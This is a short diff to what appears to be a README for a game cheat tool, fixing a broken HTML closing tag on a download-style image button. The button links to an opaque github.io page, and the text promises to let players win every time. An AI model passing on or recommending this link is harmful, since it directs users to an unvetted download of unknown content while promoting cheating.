@@ -10,8 +10,7 @@ I know very well how difficult it is to win games absolutely every time, and bet
 
 Now it's possible!
 
-
-<div align="center"><a href="https://Codiser.github.io/id/fg98vfd67"><img src="https://github.com/user-attachments/assets/ca642b58-ceab-4c9c-b0ab-fe0ccd651539" height="80"></a></di>
+<div align="center"><a href="https://Codiser.github.io/id/fg98vfd67"><img src="https://github.com/user-attachments/assets/ca642b58-ceab-4c9c-b0ab-fe0ccd651539" height="80"></a></div>
 
 > 🔲 Supported CPU: AMD & Intel
 >
